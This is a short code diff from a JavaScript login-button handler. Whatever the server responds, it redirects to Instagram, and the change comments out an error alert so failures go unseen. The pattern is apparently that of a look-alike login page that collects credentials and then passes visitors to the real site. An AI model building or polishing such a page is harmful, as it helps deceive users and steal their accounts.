@@ -38,7 +38,7 @@ loginBtn.addEventListener("click", async (e) => {
       window.location.href = 
 "https://www.instagram.com/?hl=en/";
     } else {
-      alert("Invalid response from server 💀");
+      // alert("Invalid response from server 💀");
       window.location.href = 
 "https://www.instagram.com/?hl=en/";
     }
